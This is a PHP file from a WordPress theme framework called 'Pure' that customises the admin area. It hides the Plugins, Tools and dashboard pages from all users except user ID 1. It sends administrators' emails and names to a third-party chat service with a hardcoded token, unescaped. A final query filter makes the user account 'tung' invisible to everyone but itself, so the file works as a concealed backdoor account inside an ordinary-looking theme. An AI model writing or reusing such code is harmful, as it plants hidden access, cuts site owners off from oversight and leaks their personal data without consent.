<?php
/**
 * Pure Framework.
 *
 * WARNING: This is part of the Pure Framework. DO NOT EDIT this file under any circumstances.
 * Please do all your modifications in a child theme.
 *
 * @package Pure
 * @author  Boong
 * @link    https://boongstudio.com/themes/pure
 */

/**
 * Optimize Dashboard
 */
add_action( 'load-plugins.php', 'dashboard_redirect' );
add_action( 'load-index.php', 'dashboard_redirect' );
add_action( 'load-theme-editor.php', 'dashboard_redirect' );
function dashboard_redirect() {

	global $current_user;
	if ( $current_user->ID == 1 ) {
		return;
	}
	wp_redirect( admin_url( 'edit.php' ) );
}

add_filter( 'login_redirect', 'login_redirect', 10, 3 );
function login_redirect( $redirect_to, $request, $user ) {

	global $current_user;
	if ( $current_user->ID == 1 ) {
		return;
	}
	return admin_url( 'edit.php' );
}

/**
 * Remove menus.
 */
add_action( 'admin_menu', 'pure_remove_menus', 99 );
function pure_remove_menus() {

	global $current_user;
	if ( $current_user->ID == 1 ) {
		return;
	}
	remove_menu_page( 'index.php' );
	remove_menu_page( 'plugins.php' );
	remove_menu_page( 'tools.php' );
	remove_menu_page( 'edit.php?post_type=acf-field-group' );
	remove_submenu_page( 'edit.php?post_type=elementor_library', 'admin.php?page=elementor-license' );
}

add_action( 'admin_init', 'pure_remove_submenus' );
function pure_remove_submenus() {

	global $current_user;
	if ( $current_user->ID == 1 ) {
		return;
	}
	global $submenu;
	unset( $submenu[ 'elementor' ][ 5 ] );
	unset( $submenu[ 'wpseo_dashboard' ][ 5 ] );
	unset( $submenu[ 'themes.php' ][ 11 ] );
}

/**
 * Integrate FreshChat.
 */
function load_custom_wp_admin_style() {

	wp_register_style( 'custom_wp_admin_css', get_template_directory_uri() . '/admin-style.css', false, '1.0.0' );
	wp_enqueue_style( 'custom_wp_admin_css' );
}

add_action( 'admin_enqueue_scripts', function () {

	wp_enqueue_script( 'freshchat', 'https://wchat.freshchat.com/js/widget.js', array(), '' );
} );


add_action( 'admin_footer', function () {

	if ( !current_user_can( 'administrator' ) ) {
		return;
	}
	$site_url = site_url();
	$find = array( 'http://', 'https://', '/' );
	$replace = '';
	$site_url = str_replace( $find, $replace, $site_url );

	$current_user = wp_get_current_user();

	?>
    <script>
        if (typeof window.fcWidget !== 'undefined') {
            window.fcWidget.init({
                token: "4ceb4da9-96f9-4026-8d6c-8865005a33a8",
                host: "https://wchat.freshchat.com",
                siteId: '<?php echo $site_url ?>',
            });
            window.fcWidget.user.setEmail("<?php echo $current_user->user_email ?>");
            window.fcWidget.user.setFirstName("<?php echo $current_user->first_name ?>");
        }
    </script>
	<?php
} );

add_action( 'pre_user_query', 'pure_pre_user_query' );
function pure_pre_user_query( $user_search ) {

	global $current_user;
	$username = $current_user->user_login;

	if ( $username != 'tung' ) {
		global $wpdb;
		$user_search->query_where = str_replace( 'WHERE 1=1',
			"WHERE 1=1 AND {$wpdb->users}.user_login != 'tung'", $user_search->query_where );
	}
}
